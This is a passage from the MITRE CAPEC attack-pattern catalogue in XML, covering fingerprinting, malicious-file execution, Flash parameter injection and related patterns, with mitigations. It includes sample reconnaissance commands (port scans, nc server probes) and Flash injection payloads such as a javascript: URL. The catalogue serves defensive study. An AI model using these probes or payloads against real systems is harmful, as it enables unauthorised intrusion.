192.173.28.130 NS2. fierymonkey.ORG 64.192.168.80 A corner stone of footprinting is Port Scanning. Let's port scan nijasvspirates.org and see what kind of services are running on that box. We type in the nijasvspirates IP into the Host prompt of the Port Scan window. We'll start searching from port number 1, and we'll stop at the default Sub7 port, 27374. Our results are: 21 TCP ftp 22 TCP ssh SSH-1.99-OpenSSH_2.30 25 TCP smtp 53 TCP domain 80 TCP www 110 TCP pop3 111 TCP sunrpc 113 TCP ident Just by this we know that Alice is running a website and email, using POP3, SUNRPC (SUN Remote Procedure Call), and ident.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-31"/>
            <Reference External_Reference_ID="REF-32"/>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pp. 38-39"/>
            <Reference External_Reference_ID="REF-34" Section="Section 3.1 Introduction, pg. 47"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="17" Name="Using Malicious Files" Abstraction="Standard" Status="Draft">
         <Description>An attack of this type exploits a system's configuration that allows an attacker to either directly access an executable file, for example through shell access; or in a possible worst case allows an attacker to upload a file and then execute it. Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="1"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="233"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="165"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>System's configuration must allow an attacker to directly access executable files or upload files to execute. This means that any access control system that is supposed to mediate communications between the subject and the object is set incorrectly or assumes a benign environment.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To identify and execute against an over-privileged system interface</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Enforce principle of least privilege</Mitigation>
            <Mitigation>Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.</Mitigation>
            <Mitigation>Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Consider a directory on a web server with the following permissions</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">drwxrwxrwx 5 admin public 170 Nov 17 01:08 webroot</xhtml:div>
               <xhtml:p>This could allow an attacker to both execute and upload and execute programs' on the web server. This one vulnerability can be exploited by a threat to probe the system and identify additional vulnerabilities to exploit.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="732"/>
            <Related_Weakness CWE_ID="285"/>
            <Related_Weakness CWE_ID="272"/>
            <Related_Weakness CWE_ID="59"/>
            <Related_Weakness CWE_ID="282"/>
            <Related_Weakness CWE_ID="275"/>
            <Related_Weakness CWE_ID="264"/>
            <Related_Weakness CWE_ID="270"/>
            <Related_Weakness CWE_ID="693"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1044</Entry_ID>
               <Entry_Name>File System Permissions Weakness</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2018-07-31">Accessing, Modifying or Executing Executable Files</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="170" Name="Web Application Fingerprinting" Abstraction="Detailed" Status="Draft">
         <Description>An attacker sends a series of probes to a web application in order to elicit version-dependent and type-dependent behavior that assists in identifying the target. An attacker could learn information such as software versions, error pages, and response headers, variations in implementations of the HTTP protocol, directory structures, and other similar information about the targeted service. This information can then be used by an attacker to formulate a targeted attack plan. While web application fingerprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="541"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Request fingerprinting] Use automated tools or send web server specific commands to web server and wait for server's response.</Description>
               <Technique>Use automated tools or send web server specific commands to web server and then receive server's response.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Increase the accuracy of server fingerprinting of Web servers] Attacker usually needs to send several different commands to accurately identify the web server. Attacker can also use automated tools to send requests to the server. The responses of the server may be different in terms of protocol behavior.</Description>
               <Technique>Observe the ordering of the several HTTP response headers. The ordering of the header of each server may have unique identities.</Technique>
               <Technique>Send bad requests or requests of nonexistent pages to the server.</Technique>
               <Technique>Attacker takes existing automated tools to recognize the type and the version of the web server in use.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Identify Web Application Software] After the web server platform software has been identified, the attacker start to identify web application technologies such as ASP, .NET, PHP and Java on the server.</Description>
               <Technique>Examine the file name extensions in URL, for example .php indicates PHP script interfaced with Apache server.</Technique>
               <Technique>Examine the HTTP Response Headers. This may leak information about software signatures</Technique>
               <Technique>Examine Cookies that may contain server's software information.</Technique>
               <Technique>Check error pages.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Experiment</Phase>
               <Description>[Identify Backend Database Version] Determining the database engine type can assist attackers' attempt to successfully execute SQL injection. Some database API such as ODBC will show a database type as part of the driver information when reporting an error.</Description>
               <Technique>Use tools to send bogus SQL query to the server and check error pages.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Any web application can be fingerprinted. However, some configuration choices can limit the useful information an attacker may collect during a fingerprinting attack.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Attacker knows how to send HTTP request, SQL query to a web application.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>While simple fingerprinting can be accomplished with only a web browser, for more thorough fingerprinting an attacker requires a variety of tools to collect information about the target. These tools might include protocol analyzers, web-site crawlers, and fuzzing tools. Footprinting a service adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
               <Note>Information Leakage</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Implementation: Obfuscate server fields of HTTP response.</Mitigation>
            <Mitigation>Implementation: Hide inner ordering of HTTP response header.</Mitigation>
            <Mitigation>Implementation: Customizing HTTP error codes such as 404 or 500.</Mitigation>
            <Mitigation>Implementation: Hide URL file extension.</Mitigation>
            <Mitigation>Implementation: Hide HTTP response header software information filed.</Mitigation>
            <Mitigation>Implementation: Hide cookie's software information filed.</Mitigation>
            <Mitigation>Implementation: Appropriately deal with error messages.</Mitigation>
            <Mitigation>Implementation: Obfuscate database type in Database API's error message.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>An attacker sends malformed requests or requests of nonexistent pages to the server. Consider the following HTTP responses.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">
                  <xhtml:div style="color:#32498D; font-weight:bold;">Response from Apache 1.3.23</xhtml:div>$ nc apache.server.com<xhtml:br/>80 GET / HTTP/3.0<xhtml:br/>
                  <xhtml:br/>HTTP/1.1 400 Bad Request<xhtml:br/>Date: Sun, 15 Jun 2003 17:12: 37 GMT<xhtml:br/>Server: Apache/1.3.23<xhtml:br/>Connection: close<xhtml:br/>Transfer: chunked<xhtml:br/>Content-Type: text/HTML; charset=iso-8859-1</xhtml:div>
               <xhtml:div style="margin-left:10px;" class="informative">
                  <xhtml:div style="color:#32498D; font-weight:bold;">Response from IIS 5.0</xhtml:div>$ nc iis.server.com 80<xhtml:br/>GET / HTTP/3.0<xhtml:br/>
                  <xhtml:br/>HTTP/1.1 200 OK<xhtml:br/>Server: Microsoft-IIS/5.0<xhtml:br/>Content-Location: http://iis.example.com/Default.htm<xhtml:br/>Date: Fri, 01 Jan 1999 20:14: 02 GMT<xhtml:br/>Content-Type: text/HTML<xhtml:br/>Accept-Ranges: bytes Last-Modified: Fri, 01 Jan 1999 20:14: 02 GMT<xhtml:br/>ETag: W/e0d362a4c335be1: ae1<xhtml:br/>Content-Length: 133</xhtml:div>
               <xhtml:p>[R.170.2]</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="497"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-36"/>
            <Reference External_Reference_ID="REF-37" Section="Testing for Web Application Fingerprint (OWASP-IG-004)"/>
            <Reference External_Reference_ID="REF-38"/>
            <Reference External_Reference_ID="REF-39" Section="WASC-45 - Fingerprinting"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="173" Name="Action Spoofing" Abstraction="Meta" Status="Stable">
         <Description>An adversary is able to disguise one action for another and therefore trick a user into initiating one type of action when they intend to initiate a different action. For example, a user might be led to believe that clicking a button will submit a query, but in fact it downloads software. Adversaries may perform this attack through social means, such as by simply convincing a victim to perform the action or relying on a user's natural inclination to do so, or through technical means, such as a clickjacking attack where a user sees one interface but is actually interacting with a second, invisible, interface.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The adversary must convince the victim into performing the decoy action.</Prerequisite>
            <Prerequisite>The adversary must have the means to control a user's interface to present them with a decoy action as well as the actual malicious action. Simple versions of this attack can be performed using web pages requiring only that the adversary be able to host (or control) content that the user visits.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Action spoofing can result in a wide variety of consequences and negatively affect all three elements of the security triad.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Avoid interacting with suspicious sites or clicking suspicious links.</xhtml:p>
               <xhtml:p>An organization should provide regular, robust cybersecurity training to its employees.</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="174" Name="Flash Parameter Injection" Abstraction="Detailed" Status="Draft">
         <Description>An adversary takes advantage of improper data validation to inject malicious global parameters into a Flash file embedded within an HTML document. Flash files can leverage user-submitted data to configure the Flash document and access the embedding HTML document. These 'FlashVars' are most often passed to the Flash file via URL arguments or from the Object or Embed tag within the embedding HTML document. If these FlashVars are not properly sanitized, an adversary may be able to embed malicious content (such as scripts) into the HTML document. The injected parameters can also provide the adversary control over other objects within the Flash file as well as full control over the parent document's DOM model. As such, this is a form of HTTP parameter injection, but the abilities granted to the Flash document (such as access to a page's document model, including associated cookies) make this attack more flexible. Flash Parameter Injection attacks can also preface further attacks such as various forms of Cross-Site Scripting (XSS) attacks in addition to Session Hijacking attacks.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="182"/>
            <Related_Attack_Pattern Nature="CanAlsoBe" CAPEC_ID="460"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="63"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="178"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Spider] Using a browser or an automated tool, an adversary records all instances of HTML documents that have embedded Flash files. If there is an embedded Flash file, he lists how to pass global parameters to the Flash file from the embedding object.</Description>
               <Technique>Use an automated tool to record all instances of URLs which have embedded Flash files and list the parameters passing to the Flash file.</Technique>
               <Technique>Use a browser to manually explore the website to see whether the HTML document has embedded Flash files or not and list the parameters passing to the Flash file.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Determine the application susceptibility to Flash parameter injection] Determine the application susceptibility to Flash parameter injection. For each URL identified in the Explore phase, the adversary attempts to use various techniques such as DOM based, reflected, flashvars, and persistent attacks depending on the type of parameter passed to the embedded Flash file.</Description>
               <Technique>When the JavaScript 'document.location' variable is used as part of the parameter, inject '#' and the payload into the parameter in the URL.</Technique>
               <Technique>When the name of the Flash file is exposed as a form or a URL parameter, the attacker injects '?' and the payload after the file name in the URL to override some global value.</Technique>
               <Technique>When the arguments passed in the 'flashvars' attributes, the attacker injects '&amp;' and payload in the URL.</Technique>
               <Technique>If some of the attributes of the &lt;object&gt; tag are received as parameters, the 'flashvars' attribute is injected into the &lt;object&gt; tag without the creator of the Web page ever intending to allow arguments to be passed into the Flash file.</Technique>
               <Technique>If shared objects are used to save data that is entered by the user persistent Flash parameter injection may occur, with malicious code being injected into the Flash file and executed, every time the Flash file is loaded.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Execute Flash Parameter Injection Attack] Inject parameters into Flash file. Based on the results of the Experiment phase, the adversary crafts the underlying malicious URL containing injected Flash parameters and submits it to the web server. Once the web server receives the request, the embedding HTML document will controllable by the adversary.</Description>
               <Technique>Craft underlying malicious URL and send it to the web server to take control of the embedding HTML document.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Skills_Required>
            <Skill Level="Medium">The attacker need inject values into the global parameters to the Flash file and understand the parent HTML document DOM structure. The attacker need be smart enough to convince the victim to his crafted link.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The attacker must convince the victim to click their crafted link.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
               <Note>Information Leakage</Note>
            </Consequence>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>User input must be sanitized according to context before reflected back to the user. The JavaScript function 'encodeURI' is not always sufficient for sanitizing input intended for global Flash parameters. Extreme caution should be taken when saving user input in Flash cookies. In such cases the Flash file itself will need to be fixed and recompiled, changing the name of the local shared objects (Flash cookies).</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>The following are examples for different types of parameters passed to the Flash file.</xhtml:p>
               <xhtml:div style="margin-left:10px;">
                  <xhtml:div style="color:#32498D; font-weight:bold;">DOM-based Flash parameter injection</xhtml:div>
                  <xhtml:div style="margin-left:10px;">&lt;object&gt;<xhtml:div style="margin-left:10px;">&lt;embed src="myFlash.swf" flashvars="location=http://example.com/index.htm#&amp;globalVar=e-v-i-l"&gt;&lt;/embed&gt;</xhtml:div>
                     <xhtml:br/>&lt;/object&gt;</xhtml:div>
               </xhtml:div>
               <xhtml:div style="margin-left:10px;" class="informative">
                  <xhtml:div style="color:#32498D; font-weight:bold;">Passing parameter in an embedded URI</xhtml:div>&lt;object type="application/x-shockwave-flash" data="myfile.swf?globalVar=e-v-i-l" &gt;&lt;/object&gt;</xhtml:div>
               <xhtml:div style="margin-left:10px;" class="informative">
                  <xhtml:div style="color:#32498D; font-weight:bold;">Passing parameter in flashvars</xhtml:div>&lt;object type="application/x-shockwafile.swf" ve-flash" data="my flashvars="language=English&amp;globalVar=e-v-i-l"&gt;&lt;/object&gt;</xhtml:div>
               <xhtml:div style="margin-left:10px;" class="informative">
                  <xhtml:div style="color:#32498D; font-weight:bold;">Persistent Flash Parameter Injection</xhtml:div>
                  <xhtml:div>
                     <xhtml:i>// Create a new shared object or read an existing one</xhtml:i>
                  </xhtml:div>mySharedObject = SharedObject.getLocal("flashToLoad");<xhtml:br/>if (_root.flashfile == undefined) {<xhtml:div style="margin-left:10px;">
                     <xhtml:div>
                        <xhtml:i>// Check whether there is a shared object saved</xhtml:i>
                     </xhtml:div>if (mySharedObject.data.flash == null) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:i>// Set a default</xhtml:i>
                        </xhtml:div>value _root.flashfile = "defaultFlash.swf";</xhtml:div>
                     <xhtml:br/>} else {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:i>// Read the flash file to load from the shared object</xhtml:i>
                        </xhtml:div>_root.flashfile = mySharedObject.data.flash;</xhtml:div>
                     <xhtml:br/>}</xhtml:div>
                  <xhtml:br/>}<xhtml:div>
                     <xhtml:i>// Store the flash file's name in the shared object</xhtml:i>
                  </xhtml:div>
                  <xhtml:br/>mySharedObject.data.flash = _root.flashfile;<xhtml:div>
                     <xhtml:i>// Load the flash file</xhtml:i>
                  </xhtml:div>
                  <xhtml:br/>getURL(_root.flashfile);</xhtml:div>
               <xhtml:p>If an unsuspecting user is lured by an attacker to click on link like this: http://example.com/vulnerable.swf?flashfile=javascript:alert(document.domain)</xhtml:p>
               <xhtml:p>The result will be not merely a one-time execution of the JavaScript code in the victim's browser in the context of the domain with the vulnerable Flash file, but every time the Flash is loaded, whether by direct reference or embedded inside the same domain, the JavaScript will be executed again.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="88"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-40"/>
            <Reference External_Reference_ID="REF-560"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Description Summary, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Description, Example_Instances, Execution_Flow, References, Related_Attack_Patterns, Related_Weaknesses, Skills_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="175" Name="Code Inclusion" Abstraction="Meta" Status="Stable">
         <Description>An adversary exploits a weakness on the target to force arbitrary code to be retrieved locally or from a remote location and executed. This differs from code injection in that code injection involves the direct inclusion of code while code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The target application must include external code/libraries that are executed when the application runs and the adversary must be able to influence the specific files that get included.</Prerequisite>
            <Prerequisite>The victim must run the targeted application, possibly using the crafted parameters that the adversary uses to identify the code to include.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The adversary may need the capability to host code modules if they wish their own code files to be included.</Resource>
         </Resources_Required>
         <Example_Instances>
            <Example>One example of this type of attack pattern is PHP file include attacks where the parameter of an include() function is set by a variable that an attacker is able to control. The result is that arbitrary code could be loaded into the PHP application and executed.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="829"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Prerequisites, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="176" Name="Configuration/Environment Manipulation" Abstraction="Meta" Status="Draft">
         <Description>An attacker manipulates files or settings external to a target application which affect the behavior of that application. For example, many applications use external configuration files and libraries - modification of these entities or otherwise affecting the application's ability to use them would constitute a configuration/environment manipulation attack.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The target application must consult external files or configuration controls to control its execution. All but the very simplest applications meet this requirement.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The attacker must have the access necessary to affect the files or other environment items the targeted application uses for its operations.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="15"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Configuration/Environment manipulation</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="177" Name="Create files with the same name as files protected with a higher classification" Abstraction="Detailed" Status="Draft">
         <Description>An attacker exploits file location algorithms in an operating system or application by creating a file with the same name as a protected or privileged file. The attacker could manipulate the system if the attacker-created file is trusted by the operating system or an application component that attempts to load the original file. Applications often load or include external files, such as libraries or configuration files. These files should be protected against malicious manipulation. However, if the application only uses the name of the file when locating it, an attacker may be able to create a file with the same name and place it in a directory that the application will search before the directory with the legitimate file is searched. Because the attackers' file is discovered first, it would be used by the target application. This attack can be extremely destructive if the referenced file is executable and/or is granted special privileges based solely on having a particular name.</Description>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="17"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target application must include external files. Most non-trivial applications meet this criterion.</Prerequisite>
            <Prerequisite>The target application does not verify that a located file is the one it was looking for through means other than the name. Many applications fail to perform checks of this type.</Prerequisite>
            <Prerequisite>The directories the target application searches to find the included file include directories writable by the attacker which are searched before the protected directory containing the actual files. It is much less common for applications to meet this criterion, but if an attacker can manipulate the application's search path (possibly by controlling environmental variables) then they can force this criterion to be met.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The attacker must have sufficient access to place an arbitrarily named file somewhere early in the application's search path.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="706"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1036</Entry_ID>
               <Entry_Name>Masquerading</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, References, Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="178" Name="Cross-Site Flashing" Abstraction="Detailed" Status="Draft">
         <Description>An attacker is able to trick the victim into executing a Flash document that passes commands or calls to a Flash player browser plugin, allowing the attacker to exploit native Flash functionality in the client browser. This attack pattern occurs where an attacker can provide a crafted link to a Flash document (SWF file) which, when followed, will cause additional malicious instructions to be executed. The attacker does not need to serve or control the Flash document. The attack takes advantage of the fact that Flash files can reference external URLs. If variables that serve as URLs that the Flash application references can be controlled through parameters, then by creating a link that includes values for those parameters, an attacker can cause arbitrary content to be referenced and possibly executed by the targeted Flash application.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="182"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
